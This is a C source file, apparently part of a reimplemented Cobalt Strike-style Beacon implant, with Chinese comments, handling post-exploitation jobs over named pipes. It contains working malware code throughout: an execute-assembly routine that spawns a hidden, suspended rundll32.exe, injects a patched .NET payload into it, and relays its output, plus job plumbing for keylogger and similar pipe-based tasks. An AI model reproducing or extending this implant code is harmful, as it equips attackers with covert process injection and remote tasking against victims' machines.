#include "Job.h"
#include "Command.h"
#include "Pipe.h"
#include "DllInject.h"

JOB_ENTRY* gJobs = NULL;

JOB_ENTRY* JobAdd(JOB_ENTRY* new_job)
{
	static DWORD gJobCurrentId = 0;

	JOB_ENTRY* job = gJobs;
	new_job->id = gJobCurrentId++;

	// 放在链表末尾
	if (job)
	{
		while (job->next)
			job = job->next;

		job->next = new_job;
	}
	else
	{
		gJobs = new_job;
	}

	return job;
}

void JobCleanup()
{
	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->isDead)
		{
			if (!job->isPipe)
			{
				CloseHandle(job->process);
				CloseHandle(job->thread);
				CloseHandle(job->hRead);
				CloseHandle(job->hWrite);
			}
			else
			{
				DisconnectNamedPipe(job->hRead);
				CloseHandle(job->hRead);
			}
		}
	}

	JOB_ENTRY* pre_job = NULL;
	JOB_ENTRY** pnext_job;
	for (JOB_ENTRY* job = gJobs; job; job = *pnext_job)
	{
		if (!job->isDead)
		{
			pre_job = job;
			pnext_job = &job->next;
			continue;
		}

		if (pre_job)
			pnext_job = &pre_job->next;
		else
			pnext_job = &gJobs;

		*pnext_job = job->next;
		free(job);
	}
}

JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callback_type, unsigned char* description, BOOL isMsgMode)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job) {
		fprintf(stderr, "Memory allocation failed\n");
		return NULL;
	}

	job->hWrite = INVALID_HANDLE_VALUE;
	job->next = NULL;
	job->isMsgMode = isMsgMode;
	job->hRead = hRead;
	job->isPipe = TRUE;
	job->pid32 = pid32;
	job->callbackType = callback_type;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

JOB_ENTRY* JobRegisterProcess(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite, unsigned char* description)
{
	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
	if (!job) {
		fprintf(stderr, "Memory allocation failed\n");
		return NULL;
	}

	job->process = pi->hProcess;
	job->thread = pi->hThread;
	job->next = NULL;
	job->isPipe = FALSE;
	job->hRead = hRead;
	job->hWrite = hWrite;
	job->pid = pi->dwProcessId;
	job->callbackType = CALLBACK_OUTPUT;
	job->isMsgMode = JOB_MODE_BYTE;
	job->pid32 = pi->dwProcessId;
	strncpy(job->description, description, sizeof(job->description));

	return JobAdd(job);
}

DWORD JobReadDataFromPipe(HANDLE hPipe, unsigned char* buffer, int size)
{
	DWORD totalBytesAvail = 0;
	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &totalBytesAvail, NULL)) {
		fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
		return -1;
	}

	DWORD NumberOfBytesRead = 0;
	DWORD totalRead = 0;

	while (totalBytesAvail)
	{
		if (totalRead >= size) {
			fprintf(stdout, "Read header size failed or header size too large than post packet, so enough.\n");
			break;
		}

		// 能读多少读多少
		if (!ReadFile(hPipe, buffer, size - totalRead, &NumberOfBytesRead, NULL)) {
			fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
			return -1;
		}

		totalRead += NumberOfBytesRead;
		buffer += NumberOfBytesRead;

		if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &totalBytesAvail, NULL)) {
			fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
			return -1;
		}
	}

	return totalRead;
}

DWORD JobReadDataFromPipeWithHeader(HANDLE hPipe, unsigned char* buffer, int max)
{
	DWORD lpTotalBytesAvail;
	DWORD get_size = 0;

	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &lpTotalBytesAvail, NULL)) {
		fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
		return -1;
	}

	if (!lpTotalBytesAvail) {
		return 0;
	}

	// 先从管道读取大小
	if (ProtocolSmbPipeRead(hPipe, (unsigned char*)&get_size, 4) != sizeof(get_size) || get_size > max) {
		fprintf(stderr, "Read header size failed or header size too large than post packet\n");
		return -1;
	}

	return ProtocolSmbPipeRead(hPipe, buffer, get_size);
}

int ProtocolSmbPipeRead(HANDLE hPipe, unsigned char* buffer, int length)
{
	int NumberOfBytesRead, totalRead;

	for (totalRead = 0; totalRead < length; totalRead += NumberOfBytesRead)
	{
		if (!ReadFile(hPipe, buffer + totalRead, length - totalRead, &NumberOfBytesRead, NULL)) {
			fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
			return -1;
		}

		if (NumberOfBytesRead == 0)
			return -1;
	}

	if (totalRead != length)
		return -1;

	return totalRead;
}

void ProcessJobEntry(int max) {
	JOB_ENTRY* global_job = gJobs;
	/*
	* 必须为有符号
	* 在JobReadDataFromPipeWithHeader 和
	* JobReadDataFromPipe 中直接返回了 -1 无符号表示为0xFFFFFFFF
	* 判断 totalRead 就会大于 0
	* 传入到 DataProcess 中就为 0xFFFFFFFF 
	* 从而在 DataProcess 引发访问边界错误
	*/
	int totalRead = 0;
	unsigned char* buffer = NULL;

	// 没有注册的 Job
	if(global_job == NULL)
		return;

	buffer = (unsigned char*)malloc(sizeof(unsigned char) * max);

	while (global_job) {
		/*
		* JOB_MODE_MESSAGE 指的是读取带有头部长度的消息(keylogger、keylogger)
		* 每次读取的是一个固定大小
		*/

		/*
		* JOB_MODE_BYTE 对应的读取方式为字节流有多少读多少(execute-assembly)
		*/
		if (global_job->isMsgMode == JOB_MODE_MESSAGE) {
			totalRead = JobReadDataFromPipeWithHeader(global_job->hRead, buffer, max);
		}
		else {
			totalRead = JobReadDataFromPipe(global_job->hRead, buffer, max);
		}

		if (totalRead > 0) {
			DataProcess(buffer, totalRead, global_job->callbackType);
		}

		// 判断是否有 Die 的进程
		if (global_job->isPipe == JOB_ENTRY_NAMEDPIPE && totalRead == -1) {
			global_job->isDead = JOB_STATUS_DEAD;
		}
		else if(global_job->isPipe == JOB_ENTRY_PROCESS && WaitForSingleObject(global_job->process, 0) != WAIT_TIMEOUT) {
			global_job->isDead = JOB_STATUS_DEAD;
		}
		if (global_job->isMsgMode == JOB_MODE_MESSAGE && totalRead > 0) {

		}
		else {
			global_job = (JOB_ENTRY*)global_job->next;
		}
	} 

	free(buffer);
	JobCleanup();
}

unsigned char* CmdJobList(size_t* post_length) {
	formatp format;
	BeaconFormatAlloc(&format, 0x8000);

	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		BeaconFormatPrintf(&format, "%d\t%d\t%s\n", job->id, job->pid32, job->description);
	}

	int size = BeaconDataLength(&format);
	unsigned char* original = BeaconDataOriginal(&format);

	*post_length = size;
	unsigned char* post_buffer = (unsigned char*)malloc(size);
	if (!post_buffer) {
		fprintf(stderr, "Memory allocation failed\n");
		return NULL;
	}
	memcpy(post_buffer, original, size);

	BeaconFormatFree(&format);

	return post_buffer;
}

unsigned char* CmdJobKill(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
	datap parser;
	BeaconDataParse(&parser, command_buffer, command_length);
	WORD id = BeaconDataShort(&parser); // job id
	BOOL Flag = FALSE;

	for (JOB_ENTRY* job = gJobs; job; job = job->next)
	{
		if (job->id == id) {
			job->isDead = TRUE;
			Flag = TRUE;
			JobCleanup();
		}
	}

	unsigned char* success = "[*] Success!";
	unsigned char* fail = "[-] Failed!";
	unsigned char* post_buffer;

	if (Flag) {
		post_buffer = (unsigned char*)malloc(strlen(success));
		if (!post_buffer) {
			fprintf(stderr, "Memory allocation failed\n");
			return NULL;
		}
		memcpy(post_buffer, success, strlen(success));
		*post_length = strlen(success);
	}
	else {
		post_buffer = (unsigned char*)malloc(strlen(fail));
		if (!post_buffer) {
			fprintf(stderr, "Memory allocation failed\n");
			return NULL;
		}
		memcpy(post_buffer, fail, strlen(fail));
		*post_length = strlen(fail);
	}
	
	return post_buffer;
}

VOID CmdJobRegister(unsigned char* command_buffer, size_t command_length, BOOL impersonate, BOOL isMsgMode)
{
	char pipe_name[64] = { 0 };
	char description[64] = { 0 };

	datap parser;
	BeaconDataParse(&parser, command_buffer, command_length);
	int pid32 = BeaconDataInt(&parser);               // 4 bytes   
	short callback_type = BeaconDataShort(&parser);   // 2 bytes
	short waite_time = BeaconDataShort(&parser);      // 2 bytes

	if (!BeaconDataStringCopySafe(&parser, pipe_name, sizeof(pipe_name)))
		return;

	if (!BeaconDataStringCopySafe(&parser, description, sizeof(description)))
		return;

	HANDLE hPipe;
	int attempts = 0;
	while (!PipeConnectWithToken(pipe_name, &hPipe, impersonate ? 0x20000 : 0))
	{
		Sleep(500);
		if (++attempts >= 20)
		{
			fprintf(stderr, "Could not connect to pipe:%lu\n", GetLastError());
			return;
		}
	}

	if (waite_time)
	{
		PipeWaitForExec(hPipe, waite_time, 500);
	}

	JobRegisterPipe(hPipe, pid32, callback_type, description, isMsgMode);
}

VOID CmdExecuteAssembly(unsigned char* command_buffer, size_t command_length) {
	// 数据包格式：
	// callbackType(2 Bytes) || waitTime(2 Bytes) || offset(4 Bytes) || description || arguLength(4 Bytes) || argument(arguLength Bytes) || patchDll(patchDllSize Bytes)
	datap* desc = BeaconDataAlloc(64);
	unsigned char* description = BeaconDataPtr(desc, 64);

	datap parser;
	BeaconDataParse(&parser, command_buffer, command_length);
	WORD callbackType = BeaconDataShort(&parser); // 2 Bytes
	WORD waitTime = BeaconDataShort(&parser);     // 2 Bytes
	DWORD offset = BeaconDataInt(&parser);        // 4 Bytes
	DWORD desc_length = BeaconDataStringCopySafe(&parser, description, 64);
	DWORD argu_length = BeaconDataInt(&parser);    // 4 Bytes
	unsigned char* argument = argu_length ? BeaconDataPtr(&parser, argu_length) : NULL;
	unsigned char* patch_csharp = BeaconDataBuffer(&parser);
	DWORD patch_csharp_size = BeaconDataLength(&parser);

	JobSpawn(callbackType, waitTime, offset, patch_csharp, patch_csharp_size, argument, argu_length, description, desc_length);

	BeaconDataFree(desc);
}

BOOL JobSpawn(WORD callback_type, WORD wait_time, DWORD offset, unsigned char* patch_csharp, DWORD patch_csharp_size, unsigned char* argument, DWORD argu_length, unsigned char* description, DWORD desc_length) {
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

	HANDLE hRead, hWrite;
	CreatePipe(&hRead, &hWrite, &sa, 0x100000);
	GetStartupInfoA(&si);
	si.hStdOutput = hWrite;
	si.hStdError = hWrite;
	si.hStdInput = NULL;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	unsigned char* spawnProcess = "C:\\Windows\\System32\\rundll32.exe";
	if (!CreateProcessA(NULL, spawnProcess, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		fprintf(stderr, "CreateProcessA failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	Sleep(100);
	InjectProcessLogic(&pi, pi.hProcess, pi.dwProcessId, patch_csharp, patch_csharp_size, offset, argument, argu_length);

	// 等待 waitTime(默认 2s) 2s 内向管道中取数据
	if (wait_time) {
		PipeWaitForExec(hRead, wait_time, 500);
	}

	JobRegisterProcess(&pi, hRead, hWrite, description);
}



